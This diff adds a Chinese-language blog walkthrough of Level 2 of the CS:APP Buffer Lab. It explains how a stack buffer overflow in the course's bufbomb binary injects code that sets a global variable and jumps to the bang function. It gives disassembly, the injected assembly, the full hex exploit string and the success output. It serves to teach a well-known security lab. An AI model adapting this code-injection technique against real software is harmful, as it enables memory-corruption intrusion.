@@ -150,4 +150,92 @@ VALID
 NICE JOB!
 ```
 
+### Level 2: Firecracker (15 pts)
+
+这一步的要求是 `getbuf` 返回的时候调用如下函数：
+
+```c
+int global_value = 0;
+
+void bang(int val)
+{
+  if (global_value == cookie) {
+    printf("Bang!: You set global_value to 0x%x\n", global_value);
+    validate(2);
+  } else
+    printf("Misfire: global_value = 0x%x\n", global_value);
+  exit(0);
+}
+```
+
+但在修改前需要先将 `global_value` 全局变量修改为和 `cookie` 相同的值。
+
+思路是在 `getbuf` 返回时跳转到用户输入的 buf 地址，在这里填充特定的字节序列，实现修改 `global_value` 为 `cookie` 以及跳转到 `bang` 函数的功能。
+
+通过反汇编可以知道 `global_value` 的地址为 `0x804d100`，`bang` 函数的地址为：`0x08048c9d`, 代码如下：
+
+```
+08048c9d <bang>:
+ 8048c9d:	55                   	push   %ebp
+ 8048c9e:	89 e5                	mov    %esp,%ebp
+ 8048ca0:	83 ec 18             	sub    $0x18,%esp
+ 8048ca3:	a1 00 d1 04 08       	mov    0x804d100,%eax
+ 8048ca8:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax
+ 8048cae:	75 26                	jne    8048cd6 <bang+0x39>
+ ...
+```
+
+下一步需要找到 buf 缓冲区的地址，通过前面 Level 的分析可知 buf 是在栈上的，通过 GDB 单步执行完下面的 `lea` 指令这一步，然后查看 `%eax` 寄存器的值可知 buf 的地址为 `0x55683588`。
+
+```x86asm
+080491f4 <getbuf>:
+ 80491f4:	55                   	push   %ebp
+ 80491f5:	89 e5                	mov    %esp,%ebp
+ 80491f7:	83 ec 38             	sub    $0x38,%esp
+ 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax
+ 80491fd:	89 04 24             	mov    %eax,(%esp)
+ 8049200:	e8 f5 fa ff ff       	call   8048cfa <Gets>
+ 8049205:	b8 01 00 00 00       	mov    $0x1,%eax
+ 804920a:	c9                   	leave  
+ 804920b:	c3                   	ret   
+```
+
+我们在执行 `bang` 前要执行的代码如下，其中立即数 `0x1005b2b7` 是我们的 `cookie` 值：
+
+```x86asm
+movl $0x804d100, %eax
+movl $0x1005b2b7, (%eax)
+ret
+```
+
+可以使用如下命令将上述汇编代码转成机器码：
+
+```bash
+unix> gcc -m32 -c example.S
+unix> objdump -d example.o > example.d
+```
+
+我们要输入的字符串如下：
+
+```
+b8 00 d1 04 08 c7 00 b7 b2 05 10 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 88 35 68 55 9d 8c 04 08
+```
+
+`getbuf` 在执行 `Gets` 后的栈应该如下图所示：
+
+![](images/02_24_level_1_stack.svg)
+
+**图 3：调用 Gets 后的 getbuf 的栈帧情况**
+
+假设上述的输入序列已经保存在文件 `2_bang_hex.txt` 可使用如下命令，验证：
+
+```bash
+$ ./hex2raw < 2_bang_hex.txt | ./bufbomb -u bovik
+Userid: bovik
+Cookie: 0x1005b2b7
+Type string:Bang!: You set global_value to 0x1005b2b7
+VALID
+NICE JOB!
+```
+
 https://jtchen.io/blog/csapp-bufferlab
